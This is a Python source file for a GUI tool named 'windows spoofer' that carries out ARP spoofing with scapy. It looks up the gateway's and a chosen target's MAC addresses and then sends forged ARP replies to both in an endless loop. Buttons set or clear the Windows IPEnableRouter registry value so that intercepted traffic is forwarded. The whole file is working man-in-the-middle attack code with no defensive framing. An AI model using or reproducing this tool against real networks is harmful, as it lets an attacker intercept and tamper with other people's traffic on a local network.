import os
import sys
import winreg
import threading

from scapy.all import *
from tkinter import *
import tkinter as tk
from tkinter import ttk
from tkinter import scrolledtext
from tkinter import filedialog as fd
from tkinter import messagebox
from tkinter.messagebox import OK, INFO, showinfo, showerror


class MainWindow(tk.Frame):
    def __init__(self, root):
        super().__init__(root)
        self.init_main()

    def init_main(self):
        self.thread_stop = False
        self.thread_count = 0
        self.lb_name = Label(text=u"< Enter spoofing ip >", font="Calibri 12", fg="white", bg="black")
        self.lb_name.pack()
        self.name = Entry(width=24, font="Calibri 13", fg="white", bg="black")
        self.name.pack(padx=10)

        self.btn_start = tk.Button(text='start', font="Calibri 12", fg="white", bg="#0d0d0d", width=14, height=1, compound='left',
                                command=lambda: self.start_spoof(self.name.get()))
        self.btn_start.place(x=45, y=80)

        self.btn_stop = tk.Button(text='stop', font="Calibri 12", fg="white", bg="#0d0d0d", width=14, height=1, compound='left',
                                command=lambda: self.restore_spoof(self.name.get()))
        self.btn_stop.place(x=225, y=80)

        self.btn_enable = tk.Button(text='enable', font="Calibri 12", fg="white", bg="#0d0d0d", width=14, height=1, compound='left',
                                command=lambda: self.enable_regedit())
        self.btn_enable.place(x=45, y=130)

        self.btn_enable = tk.Button(text='disable', font="Calibri 12", fg="white", bg="#0d0d0d", width=14, height=1, compound='left',
                                command=lambda: self.disable_regedit())
        self.btn_enable.place(x=225, y=130)

    def close_(self):
        sys.exit()

    def validate_ip(self, ip):
        a = ip.split('.')
        if len(a) != 4:
            return False
        for x in a:
            if not x.isdigit():
                return False
            i = int(x)
            if i < 0 or i > 255:
                return False
        return True

    def enable_regedit(self):
        try:
            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters")
            winreg.SetValueEx(key, "IPEnableRouter", 0, winreg.REG_SZ, "1")
            messagebox.showinfo(title="Info", message="Ip forwarding is enable. Restart your PC.", icon=INFO, default=OK)
        except Exception as e:
            print(e)
            showerror(title="Error", message="Enable error. Please run as Administrator.")

    def disable_regedit(self):
        try:
            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters")
            winreg.SetValueEx(key, "IPEnableRouter", 0, winreg.REG_SZ, "0")
            messagebox.showinfo(title="Info", message="Ip forwarding is disable. Restart your PC.", icon=INFO, default=OK)
        except Exception as e:
            print(e)
            showerror(title="Error", message="Disabled error. Please run as Administrator.")

    def get_mac(self, target_ip):
        arp_request = ARP(pdst=target_ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = srp(arp_request_broadcast, timeout=5, verbose=False)[0]
        print(answered_list[0][1].hwsrc)
        return answered_list[0][1].hwsrc

    def arp_spoof(self, ip_spoof):
        self.thread_stop = False
        if not self.validate_ip(ip_spoof):
            showerror(title="Error", message="Please, enter correct ip")
        else:
            send_packet_count = 0
            ip_gw = conf.route.route("0.0.0.0")[2]
            mac_gw = self.get_mac(ip_gw)
            mac_spoof = self.get_mac(ip_spoof)
            packet_1 = ARP(op=2, pdst=ip_gw, hwdst=mac_gw, psrc=ip_spoof)
            packet_2 = ARP(op=2, pdst=ip_spoof, hwdst=mac_spoof, psrc=ip_gw)
            while True:
                if self.thread_stop:
                    return
                send_packet_count += 2
                send(packet_1, verbose=False)
                send(packet_2, verbose=False)
                print('\r### was_send  ' + str(send_packet_count) + '  arp_packet ###', end="")
                time.sleep(0.5)

    def start_spoof(self, ip_spoof):
        self.thread_count += 1
        if self.thread_count > 1:
            showerror(title="Error", message="I cant run new thread")
        else:
            spoofer = threading.Thread(name="spoofer", target=self.arp_spoof, args=(ip_spoof, ))
            spoofer.start()

    def restore_spoof(self, ip_spoof):
        self.thread_stop = True
        self.thread_count = 0
        if not self.validate_ip(ip_spoof):
            showerror(title="Error", message="Please, enter correct ip")
        else: 
            ip_gw = conf.route.route("0.0.0.0")[2]
            mac_gw = self.get_mac(ip_gw)
            mac_spoof = self.get_mac(ip_spoof)
            packet_1 = ARP(op=2, pdst=ip_gw, hwdst=mac_gw, psrc=ip_spoof, hwsrc=mac_spoof)
            packet_2 = ARP(op=2, pdst=ip_spoof, hwdst=mac_spoof, psrc=ip_gw, hwsrc=mac_gw)
            send(packet_1, count=4, verbose=False)
            send(packet_2, count=4, verbose=False)
            print('off')

    def run_app():
        root = tk.Tk()
        root.resizable(width=False, height=False)
        MainWindow(root)
        root.title("windows spoofer")
        root.geometry("400x180")
        root.configure(bg="black")
        root.mainloop()


if __name__ == '__main__':
    qr = MainWindow
    qr.run_app()
